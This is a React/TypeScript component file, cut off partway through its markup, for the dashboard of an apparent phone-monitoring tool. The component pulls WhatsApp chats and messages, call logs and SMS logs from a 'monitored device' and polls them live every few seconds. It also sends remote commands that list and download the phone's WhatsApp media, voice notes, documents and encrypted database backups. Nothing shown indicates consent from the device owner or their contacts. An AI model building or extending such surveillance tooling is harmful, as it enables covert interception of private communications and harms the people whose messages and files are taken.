import { useEffect, useMemo, useRef, useState } from "react";
import { devicesApi } from "../api/devices";
import { downloadFileViaRelay } from "../api/fileDownload";
import type { CallLogEntry, SmsLogEntry, WhatsAppChatSummary, WhatsAppMessage } from "../api/types";

// ============================================================================
// TYPES & DATA MODELS
// ============================================================================
interface FileEntryDtoLocal {
  name: string;
  path: string;
  isDirectory: boolean;
  sizeBytes: number | null;
  mimeType: string | null;
}

type AvailableAppId = "whatsapp" | "telegram" | "instagram" | "messenger";

interface AppMetadata {
  id: AvailableAppId;
  name: string;
  packageName: string;
  color: string;
  badge: "Active" | "Coming Soon";
  isSupported: boolean;
  description: string;
}

const SUPPORTED_APPS: AppMetadata[] = [
  {
    id: "whatsapp",
    name: "WhatsApp",
    packageName: "com.whatsapp",
    color: "#25D366",
    badge: "Active",
    isSupported: true,
    description: "WhatsApp chats, media & databases",
  },
  {
    id: "telegram",
    name: "Telegram",
    packageName: "org.telegram.messenger",
    color: "#229ED9",
    badge: "Coming Soon",
    isSupported: false,
    description: "Encrypted channels & direct messages",
  },
  {
    id: "instagram",
    name: "Instagram Direct",
    packageName: "com.instagram.android",
    color: "#E1306C",
    badge: "Coming Soon",
    isSupported: false,
    description: "DMs & shared post media",
  },
  {
    id: "messenger",
    name: "Messenger",
    packageName: "com.facebook.orca",
    color: "#0084FF",
    badge: "Coming Soon",
    isSupported: false,
    description: "Facebook conversations & voice clips",
  },
];

export interface UnifiedChatSummary {
  id: string;
  chatName: string;
  subtitle?: string | null;
  lastMessage: string | null;
  lastMessageAt: string;
  lastIsOutgoing: boolean;
  totalMessages: number;
  source: "whatsapp";
}

export interface UnifiedChatMessage {
  id: string | number;
  sender: string | null;
  text: string;
  isOutgoing: boolean;
  timestamp: string;
  mediaType?: string | null;
  mediaPath?: string | null;
}

const AUTO_REFRESH_INTERVAL_MS = 4000; // Live update interval (real-time chat updates)

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================
function formatSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function parentOf(path: string): string {
  const normalized = path.replace(/\\/g, "/");
  const idx = normalized.lastIndexOf("/");
  return idx === -1 ? "" : normalized.slice(0, idx);
}

function timeAgo(dateString: string): string {
  try {
    const date = new Date(dateString);
    const now = new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffMin = Math.floor(diffMs / 60000);
    if (diffMin < 1) return "Just now";
    if (diffMin < 60) return `${diffMin}m ago`;
    const diffHours = Math.floor(diffMin / 60);
    if (diffHours < 24) return `${diffHours}h ago`;
    const diffDays = Math.floor(diffHours / 24);
    if (diffDays === 1) return "Yesterday";
    if (diffDays < 7) return `${diffDays}d ago`;
    return date.toLocaleDateString();
  } catch {
    return dateString;
  }
}

function getMessageDateGroup(dateString: string): string {
  try {
    const msgDate = new Date(dateString);
    const today = new Date();
    const yesterday = new Date();
    yesterday.setDate(today.getDate() - 1);

    if (msgDate.toDateString() === today.toDateString()) return "Today";
    if (msgDate.toDateString() === yesterday.toDateString()) return "Yesterday";
    return msgDate.toLocaleDateString(undefined, { weekday: "short", month: "short", day: "numeric" });
  } catch {
    return "Recent";
  }
}

function formatMessageTime(dateString: string): string {
  try {
    const d = new Date(dateString);
    return d.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" });
  } catch {
    return "";
  }
}

function formatMessageDateTime(dateString: string): string {
  try {
    const d = new Date(dateString);
    return `${d.toLocaleDateString(undefined, { month: "short", day: "numeric" })} at ${d.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" })}`;
  } catch {
    return dateString;
  }
}

function isWithinLast5Days(dateString: string, refDate: Date = new Date()): boolean {
  try {
    const time = new Date(dateString).getTime();
    if (isNaN(time)) return true;
    const fiveDaysAgo = refDate.getTime() - 5 * 24 * 60 * 60 * 1000;
    return time >= fiveDaysAgo;
  } catch {
    return true;
  }
}

function isWhatsAppChannel(chat: UnifiedChatSummary): boolean {
  const name = chat.chatName.toLowerCase().trim();
  const sub = (chat.subtitle || "").toLowerCase().trim();
  const last = (chat.lastMessage || "").toLowerCase().trim();
  return (
    name.includes("channel") ||
    name.includes("broadcast") ||
    name.includes("updates") ||
    name.includes("news") ||
    name.includes("official") ||
    name === "whatsapp" ||
    name === "whatsapp status" ||
    name.includes("community") ||
    sub.includes("channel") ||
    sub.includes("broadcast") ||
    last.includes("broadcast")
  );
}

// ============================================================================
// SVG ICONS
// ============================================================================
function WhatsAppLogo({ className = "w-5 h-5" }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.746.953 3.71 1.456 5.711 1.457h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.411z" />
    </svg>
  );
}


function TelegramLogo({ className = "w-5 h-5" }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.75-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .37z" />
    </svg>
  );
}

function InstagramLogo({ className = "w-5 h-5" }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
    </svg>
  );
}

function MessengerLogo({ className = "w-5 h-5" }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 2C6.477 2 2 6.145 2 11.258c0 2.91 1.455 5.517 3.735 7.185V22l3.414-1.874c.904.25 1.86.387 2.851.387 5.523 0 10-4.145 10-9.255C22 6.145 17.523 2 12 2zm1.096 12.443l-2.72-2.903-5.305 2.903 5.836-6.196 2.784 2.903 5.241-2.903-5.836 6.196z" />
    </svg>
  );
}


// ============================================================================
// MAIN APPSCARD COMPONENT
// ============================================================================
export default function AppsCard({ deviceId }: { deviceId: string }) {
  // Navigation / App State
  const [selectedApp, setSelectedApp] = useState<AvailableAppId>("whatsapp");
  const [activeView, setActiveView] = useState<"chats" | "files">("chats");
  const [timeFilter, setTimeFilter] = useState<"5days" | "all">("5days");
  const [chatCategory, setChatCategory] = useState<"chats" | "channels">("chats");
  const [dashboardLoginTime] = useState<Date>(() => new Date());

  // Real Data States
  const [whatsappChats, setWhatsappChats] = useState<WhatsAppChatSummary[]>([]);
  const [loading, setLoading] = useState(false);
  const [lastSyncedTime, setLastSyncedTime] = useState<Date>(new Date());

  // Selected chat & messages thread
  const [selectedChatId, setSelectedChatId] = useState<string | null>(null);
  const [chatSearch, setChatSearch] = useState("");
  const [messagesLoading, setMessagesLoading] = useState(false);
  const [activeThreadMessages, setActiveThreadMessages] = useState<UnifiedChatMessage[]>([]);

  // WhatsApp Storage Files State
  const [files, setFiles] = useState<FileEntryDtoLocal[] | null>(null);
  const [filesLoading, setFilesLoading] = useState(false);
  const [fileStatus, setFileStatus] = useState<string | null>(null);
  const [currentPath, setCurrentPath] = useState("");
  const [categoryFilter, setCategoryFilter] = useState<"all" | "images" | "voice" | "docs" | "db">("all");
  const [downloadingFile, setDownloadingFile] = useState<string | null>(null);

  // --------------------------------------------------------------------------
  // 1. DATA LOADER (REAL DATA FROM DEVICE)
  // --------------------------------------------------------------------------
  const loadDeviceChatData = async () => {
    setLoading(true);
    try {
      const [waData, callData, smsData] = await Promise.all([
        devicesApi.whatsAppChats(deviceId).catch((err) => {
          console.warn("WhatsApp chats fetch error:", err);
          return [] as WhatsAppChatSummary[];
        }),
        devicesApi.callLog(deviceId).catch(() => [] as CallLogEntry[]),
        devicesApi.smsLog(deviceId).catch(() => [] as SmsLogEntry[]),
      ]);

      // Filter out storage pseudo-buckets
      const realWaChats = (waData || []).filter(
        (c) =>
          !["WhatsApp Audio", "WhatsApp Photos", "WhatsApp Documents", "WhatsApp Video", "WhatsApp Media"].includes(
            c.chat_name
          )
      );

      const existingNames = new Set(realWaChats.map((c) => c.chat_name.toLowerCase().trim()));
      const combined = [...realWaChats];

      // Merge all known contacts on the device into the WhatsApp chatlist
      const contactSources = [
        ...callData.map((c) => ({ name: c.contact_name || c.counterparty, time: c.called_at })),
        ...smsData.map((s) => ({ name: s.contact_name || s.counterparty, time: s.message_at })),
      ];

      for (const cs of contactSources) {
        if (!cs.name) continue;
        const key = cs.name.toLowerCase().trim();
        if (!existingNames.has(key)) {
          existingNames.add(key);
          combined.push({
            chat_name: cs.name,
            total_messages: 1,
            last_message_at: cs.time || new Date().toISOString(),
            last_message: "WhatsApp Contact",
            last_is_outgoing: false,
          });
        }
      }

      setWhatsappChats(combined);
      setLastSyncedTime(new Date());
    } catch (e) {
      console.error("Failed to load device chat data", e);
    } finally {
      setLoading(false);
    }
  };

  // Mount + Live Auto-Refresh polling (every 15s)
  const loadRef = useRef(loadDeviceChatData);
  loadRef.current = loadDeviceChatData;

  useEffect(() => {
    loadRef.current();
    const interval = setInterval(() => {
      loadRef.current();
    }, AUTO_REFRESH_INTERVAL_MS);
    return () => clearInterval(interval);
  }, [deviceId]);

  // Formatted WhatsApp Chat Summaries
  const whatsappChatSummaries = useMemo<UnifiedChatSummary[]>(() => {
    if (!whatsappChats || whatsappChats.length === 0) return [];
    return whatsappChats.map((c) => {
      const summaryObj: UnifiedChatSummary = {
        id: `wa-${c.chat_name}`,
        chatName: c.chat_name,
        subtitle: "WhatsApp Contact",
        lastMessage: c.last_message || "(Media message)",
        lastMessageAt: c.last_message_at,
        lastIsOutgoing: c.last_is_outgoing,
        totalMessages: c.total_messages,
        source: "whatsapp",
      };
      if (isWhatsAppChannel(summaryObj)) {
        summaryObj.subtitle = "WhatsApp Channel / Broadcast";
      }
      return summaryObj;
    });
  }, [whatsappChats]);

  // Separate Chats and WhatsApp Channels so they are NEVER collapsed together
  const { personalChats, channelChats } = useMemo(() => {
    const personal: UnifiedChatSummary[] = [];
    const channels: UnifiedChatSummary[] = [];
    for (const c of whatsappChatSummaries) {
      if (isWhatsAppChannel(c)) {
        channels.push(c);
      } else {
        personal.push(c);
      }
    }
    return { personalChats: personal, channelChats: channels };
  }, [whatsappChatSummaries]);

  // Active Chats for the currently selected category tab (Chats vs Channels)
  const activeCategoryChats = useMemo<UnifiedChatSummary[]>(() => {
    if (selectedApp === "whatsapp") {
      return chatCategory === "chats" ? personalChats : channelChats;
    }
    return [];
  }, [selectedApp, chatCategory, personalChats, channelChats]);

  // Filtered Chats by search within the currently active category
  const displayedChats = useMemo<UnifiedChatSummary[]>(() => {
    if (!chatSearch.trim()) return activeCategoryChats;
    const q = chatSearch.toLowerCase();
    return activeCategoryChats.filter(
      (c) =>
        c.chatName.toLowerCase().includes(q) ||
        (c.subtitle && c.subtitle.toLowerCase().includes(q)) ||
        (c.lastMessage && c.lastMessage.toLowerCase().includes(q))
    );
  }, [activeCategoryChats, chatSearch]);

  // Auto-select first chat when category tab, search, or app changes
  useEffect(() => {
    if (displayedChats.length > 0) {
      if (!selectedChatId || !displayedChats.some((c) => c.id === selectedChatId)) {
        setSelectedChatId(displayedChats[0].id);
      }
    } else {
      setSelectedChatId(null);
    }
  }, [chatCategory, displayedChats, selectedApp]);

  // --------------------------------------------------------------------------
  // 3. LOAD CHAT CONVERSATION MESSAGES (LIVE POLLING & LAST 5 DAYS)
  // --------------------------------------------------------------------------
  useEffect(() => {
    if (!selectedChatId) {
      setActiveThreadMessages([]);
      return;
    }

    const currentChat = whatsappChatSummaries.find((c) => c.id === selectedChatId);
    if (!currentChat) {
      setActiveThreadMessages([]);
      return;
    }

    let isMounted = true;
    const fetchChatMessages = (isInitial: boolean) => {
      if (isInitial) setMessagesLoading(true);

      devicesApi
        .whatsAppMessages(deviceId, currentChat.chatName)
        .then((msgs: WhatsAppMessage[]) => {
          if (!isMounted) return;
          const list = msgs || [];
          const filtered = timeFilter === "all" ? list : list.filter((m) => isWithinLast5Days(m.message_time, dashboardLoginTime));
          const effective = filtered.length > 0 ? filtered : list;
          const unified: UnifiedChatMessage[] = effective.map((m) => ({
            id: m.id,
            sender: m.is_outgoing ? "Me" : m.sender || currentChat.chatName,
            text: m.message_text,
            isOutgoing: m.is_outgoing,
            timestamp: m.message_time,
            mediaType: m.media_type,
            mediaPath: m.media_path,
          }));

          // Fallback to preview last message if no thread items exist yet
          if (
            unified.length === 0 &&
            currentChat.lastMessage &&
            currentChat.lastMessage !== "WhatsApp Contact"
          ) {
            unified.push({
              id: `preview-${currentChat.id}`,
              sender: currentChat.lastIsOutgoing ? "Me" : currentChat.chatName,
              text: currentChat.lastMessage,
              isOutgoing: currentChat.lastIsOutgoing,
              timestamp: currentChat.lastMessageAt || new Date().toISOString(),
            });
          }

          setActiveThreadMessages(unified);
        })
        .catch((err) => {
          if (!isMounted) return;
          console.warn("Failed to load WhatsApp messages:", err);
        })
        .finally(() => {
          if (isMounted && isInitial) setMessagesLoading(false);
        });
    };

    fetchChatMessages(true);

    // Silent background live polling every 4 seconds so chats update in real time
    const liveInterval = setInterval(() => {
      fetchChatMessages(false);
    }, 4000);

    return () => {
      isMounted = false;
      clearInterval(liveInterval);
    };
  }, [selectedChatId, whatsappChatSummaries, deviceId, timeFilter, dashboardLoginTime]);

  // Grouped conversation messages by day (Today, Yesterday, etc.)
  const groupedMessages = useMemo(() => {
    const groups: { dateLabel: string; items: UnifiedChatMessage[] }[] = [];
    activeThreadMessages.forEach((msg) => {
      const label = getMessageDateGroup(msg.timestamp);
      const existing = groups.find((g) => g.dateLabel === label);
      if (existing) {
        existing.items.push(msg);
      } else {
        groups.push({ dateLabel: label, items: [msg] });
      }
    });
    return groups;
  }, [activeThreadMessages]);

  const selectedChatSummary = useMemo(() => {
    return whatsappChatSummaries.find((c) => c.id === selectedChatId) || null;
  }, [whatsappChatSummaries, selectedChatId]);

  // --------------------------------------------------------------------------
  // 4. STORAGE / FILE MANAGER ACTIONS
  // --------------------------------------------------------------------------
  async function pollCommand(commandId: string, label: string) {
    setFileStatus(`${label}: waiting for device response...`);
    for (let i = 0; i < 25; i++) {
      const delay = i < 6 ? 1000 : 2000;
      await new Promise((r) => setTimeout(r, delay));
      try {
        const cmd = await devicesApi.getCommand(deviceId, commandId);
        if (cmd.status === "acked") {
          setFileStatus(`${label}: completed.`);
          return cmd;
        }
        if (cmd.status === "failed") {
          setFileStatus(`${label}: failed.`);
          return cmd;
        }
      } catch {
        // retry
      }
    }
    setFileStatus(`${label}: device response took longer.`);
    return null;
  }

  async function handleScanWhatsAppFiles() {
    setFilesLoading(true);
    setFiles(null);
    setCurrentPath("");
    setFileStatus("Requesting WhatsApp files from device...");
    try {
      const cmd = await devicesApi.createCommand(deviceId, "whatsapp_file_list");
      const result = await pollCommand(cmd.id, "WhatsApp File Scan");
      if (result?.status === "acked") {
        const full = await devicesApi.getCommand(deviceId, cmd.id);
        const fileList = (full.result?.files as FileEntryDtoLocal[]) || [];
        setFiles(fileList);
        if (fileList.length > 0) {
          const firstDir = fileList.find((f) => f.isDirectory);
          if (firstDir) setCurrentPath(parentOf(firstDir.path));
        }
      }
    } catch (e) {
      setFileStatus(`Failed to scan files: ${(e as Error).message}`);
    } finally {
      setFilesLoading(false);
    }
  }

  async function handleDownloadMedia(filePath: string, fileName: string) {
    setDownloadingFile(filePath);
    setFileStatus(`Downloading ${fileName}...`);
    try {
      if (filePath.startsWith("http://") || filePath.startsWith("https://")) {
        const a = document.createElement("a");
        a.href = filePath;
        a.download = fileName;
        a.target = "_blank";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        setFileStatus(`Downloaded ${fileName}.`);
      } else {
        const cmd = await devicesApi.createCommand(deviceId, "file_download", { path: filePath });
        const downloadPromise = downloadFileViaRelay(cmd.id, (s) => setFileStatus(s));
        await pollCommand(cmd.id, `Download: ${fileName}`);
        await downloadPromise;
        setFileStatus(`Downloaded ${fileName}.`);
      }
    } catch (e) {
      setFileStatus(`Download failed: ${(e as Error).message}`);
    } finally {
      setDownloadingFile(null);
    }
  }

  const directoryChildren = useMemo(() => {
    if (!files) return [];
    let list = files;
    if (categoryFilter === "images") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("images") ||
          f.mimeType?.startsWith("image/") ||
          /\.(jpg|jpeg|png|webp)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }
    if (categoryFilter === "voice") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("voice notes") ||
          f.path.toLowerCase().includes("audio") ||
          /\.(opus|ogg|mp3|m4a|wav)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }
    if (categoryFilter === "docs") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("documents") ||
          /\.(pdf|doc|docx|txt|xlsx|pptx)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }
    if (categoryFilter === "db") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("databases") ||
          f.path.toLowerCase().includes("backups") ||
          /\.(crypt\d+|db|bak)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }

    return list
      .filter((f) => parentOf(f.path) === currentPath)
      .sort((a, b) => {
        if (a.isDirectory !== b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.localeCompare(b.name);
      });
  }, [files, currentPath, categoryFilter]);

  const breadcrumbs = currentPath ? currentPath.split("/").filter(Boolean) : [];

  return (
    <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
      {/* ===================================================================== */}
      {/* TOP HEADER: SECTION BANNER & LIVE SYNC STATUS                         */}
      {/* ===================================================================== */}
      <div className="px-5 py-3.5 border-b border-gray-100 bg-gradient-to-r from-gray-50 via-white to-gray-50 flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-lg bg-emerald-500/10 text-emerald-600 flex items-center justify-center font-bold text-lg shadow-xs">
            💬
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-base font-bold text-gray-900 tracking-tight">Apps</h2>
              <span className="text-[11px] font-semibold uppercase px-2.5 py-0.5 rounded-full bg-emerald-50 text-emerald-700 border border-emerald-200 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                Live Sync Active
              </span>
            </div>
            <p className="text-xs text-gray-500">
              Live mobile chat conversations (last 5 days activity) and media storage
            </p>
          </div>
        </div>

        {/* Action Controls & Last Synced */}
        <div className="flex items-center gap-3">
          <span className="text-[11px] text-gray-400 hidden sm:inline">
            Updated: {lastSyncedTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" })}
          </span>

          {selectedApp === "whatsapp" && (
            <div className="bg-gray-100 p-0.5 rounded-lg flex text-xs font-medium">
              <button
                type="button"
                onClick={() => setActiveView("chats")}
                className={`px-3 py-1 rounded-md transition flex items-center gap-1.5 ${
                  activeView === "chats"
                    ? "bg-white text-gray-900 shadow-xs font-semibold"
                    : "text-gray-500 hover:text-gray-900"
                }`}
              >
                <span>💬</span>
                <span>Chats</span>
              </button>
              <button
                type="button"
                onClick={() => setActiveView("files")}
                className={`px-3 py-1 rounded-md transition flex items-center gap-1.5 ${
                  activeView === "files"
                    ? "bg-white text-gray-900 shadow-xs font-semibold"
                    : "text-gray-500 hover:text-gray-900"
                }`}
              >
                <span>📁</span>
                <span>Files</span>
              </button>
            </div>
          )}

          <button
            type="button"
            onClick={loadDeviceChatData}
            disabled={loading}
            className="text-xs text-gray-500 hover:text-emerald-600 px-2.5 py-1.5 border border-gray-200 rounded-lg hover:border-emerald-300 transition flex items-center gap-1.5 disabled:opacity-50"
            title="Refresh from phone now"
          >
            <span className={loading ? "animate-spin" : ""}>↻</span>
            <span className="font-medium">{loading ? "Syncing..." : "Refresh"}</span>
          </button>
        </div>
      </div>

      {/* ===================================================================== */}
      {/* THREE-COLUMN WORKSPACE: APPS RAIL | CHATLIST | CHAT CONVERSATION      */}
      {/* ===================================================================== */}
      <div className="grid grid-cols-1 md:grid-cols-12 h-[680px] overflow-hidden">
        {/* =================================================================== */}
        {/* COLUMN 1: APPS RAIL (LEFT)                                          */}
        {/* =================================================================== */}
        <div className="md:col-span-3 lg:col-span-2.5 border-r border-gray-100 bg-gray-50/70 p-3 space-y-3 flex flex-col h-full min-h-0 overflow-hidden">
          <div className="px-2 pt-1 flex items-center justify-between shrink-0">
            <h3 className="text-[10px] font-bold uppercase tracking-wider text-gray-400">
              Applications
            </h3>
          </div>

          <div className="space-y-1.5 flex-1 min-h-0 overflow-y-auto">
            {SUPPORTED_APPS.map((app) => {
              const isSelected = selectedApp === app.id;
              const count = app.id === "whatsapp" ? whatsappChatSummaries.length : 0;

              return (
                <button
                  key={app.id}
                  type="button"
                  onClick={() => {
                    setSelectedApp(app.id);
                    if (app.id !== "whatsapp") setActiveView("chats");
                  }}
                  className={`w-full text-left p-2.5 rounded-xl transition flex items-center gap-3 relative ${
                    isSelected
                      ? "bg-white shadow-xs border border-gray-200/90 ring-1 ring-emerald-500/20"
                      : "hover:bg-white/60 text-gray-700"
                  }`}
                >
                  {/* Brand Icon */}
                  <div
                    className="w-9 h-9 rounded-lg flex items-center justify-center shrink-0 transition"
                    style={{
                      backgroundColor: `${app.color}15`,
                      color: app.color,
                    }}
                  >
                    {app.id === "whatsapp" && <WhatsAppLogo className="w-5 h-5" />}
                    {app.id === "telegram" && <TelegramLogo className="w-5 h-5" />}
                    {app.id === "instagram" && <InstagramLogo className="w-5 h-5" />}
                    {app.id === "messenger" && <MessengerLogo className="w-5 h-5" />}
                  </div>

                  {/* App Details */}
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-1">
                      <span className="text-xs font-bold text-gray-900 truncate">
                        {app.name}
                      </span>
                      {isSelected && (
                        <span className="w-2 h-2 rounded-full bg-emerald-500 shrink-0" />
                      )}
                    </div>
                    <div className="flex items-center gap-1.5 mt-0.5">
                      <span
                        className={`text-[9px] font-semibold px-1.5 py-0.2 rounded ${
                          app.isSupported
                            ? "bg-emerald-100 text-emerald-800"
                            : "bg-gray-200/70 text-gray-600"
                        }`}
                      >
                        {app.badge}
                      </span>
                      {app.isSupported && (
                        <span className="text-[10px] text-gray-400 font-medium">
                          {count} {count === 1 ? "chat" : "chats"}
                        </span>
                      )}
                    </div>
                  </div>
                </button>
              );
            })}
          </div>

          <div className="p-2.5 rounded-lg bg-emerald-50/60 border border-emerald-100 text-[11px] text-emerald-800 space-y-1 shrink-0">
            <p className="font-semibold flex items-center gap-1">
              <span>📱</span>
              <span>Real WhatsApp Chats</span>
            </p>
            <p className="text-[10px] text-emerald-700 leading-tight">
              Shows WhatsApp conversations and media stored on the monitored device.
            </p>
          </div>
        </div>

        {/* =================================================================== */}
        {/* NON-SUPPORTED APPS (TELEGRAM, INSTAGRAM, MESSENGER)                 */}
        {/* =================================================================== */}
        {!SUPPORTED_APPS.find((a) => a.id === selectedApp)?.isSupported && (
          <div className="md:col-span-9 lg:col-span-9.5 p-12 flex flex-col items-center justify-center text-center space-y-3 bg-white">
            <div
              className="w-16 h-16 rounded-2xl flex items-center justify-center shadow-sm"
              style={{
                backgroundColor: `${
                  SUPPORTED_APPS.find((a) => a.id === selectedApp)?.color
                }15`,
                color: SUPPORTED_APPS.find((a) => a.id === selectedApp)?.color,
              }}
            >
              {selectedApp === "telegram" && <TelegramLogo className="w-8 h-8" />}
              {selectedApp === "instagram" && <InstagramLogo className="w-8 h-8" />}
              {selectedApp === "messenger" && <MessengerLogo className="w-8 h-8" />}
            </div>
            <h3 className="text-base font-bold text-gray-900">
              {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.name} Monitoring
            </h3>
            <p className="text-xs text-gray-500 max-w-sm leading-relaxed">
              Support for {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.name} will be enabled in an upcoming release. WhatsApp monitoring is currently active on this device.
            </p>
            <div className="flex items-center gap-2 pt-2">
              <button
                type="button"
                onClick={() => setSelectedApp("whatsapp")}
                className="text-xs font-semibold px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg transition"
              >
                View WhatsApp →
              </button>
            </div>
          </div>
        )}

        {/* =================================================================== */}
        {/* ACTIVE APP: CHAT VIEW (COLUMN 2: CHATLIST | COLUMN 3: CONVERSATION) */}
        {/* =================================================================== */}
        {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.isSupported &&
          activeView === "chats" && (
            <>
              {/* ----------------------------------------------------------- */}
              {/* COLUMN 2: COMPLETE CHATLIST & CHANNELS FROM MOBILE PHONE    */}
              {/* ----------------------------------------------------------- */}
              <div className="md:col-span-4 lg:col-span-3.5 border-r border-gray-100 flex flex-col bg-white h-full min-h-0 overflow-hidden">
                {/* Search Bar */}
                <div className="p-3 border-b border-gray-100 bg-gray-50/50 space-y-2 shrink-0">
                  <div className="relative">
                    <input
                      type="text"
                      placeholder={chatCategory === "chats" ? "Search WhatsApp chats..." : "Search WhatsApp channels..."}
                      value={chatSearch}
                      onChange={(e) => setChatSearch(e.target.value)}
                      className="w-full text-xs pl-8 pr-7 py-2 bg-white border border-gray-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-emerald-500 transition"
                    />
                    <span className="absolute left-2.5 top-2.5 text-gray-400 text-xs">🔍</span>
                    {chatSearch && (
                      <button
                        type="button"
                        onClick={() => setChatSearch("")}
                        className="absolute right-2.5 top-2.5 text-gray-400 hover:text-gray-600 text-xs"
                      >
                        ✕
                      </button>
                    )}
                  </div>

                  {/* Category Selector Below Search Bar: Separate Chats and WhatsApp Channels */}
                  <div className="bg-gray-200/70 p-1 rounded-lg flex text-xs font-semibold gap-1">
                    <button
                      type="button"
                      onClick={() => setChatCategory("chats")}
                      className={`flex-1 py-1.5 px-3 rounded-md transition flex items-center justify-center gap-1.5 ${
                        chatCategory === "chats"
                          ? "bg-white text-emerald-900 shadow-xs font-bold"
                          : "text-gray-600 hover:text-gray-900"
                      }`}
                    >
                      <span>💬 Chats</span>
                      <span
                        className={`text-[10px] px-1.5 py-0.2 rounded-full font-bold ${
                          chatCategory === "chats"
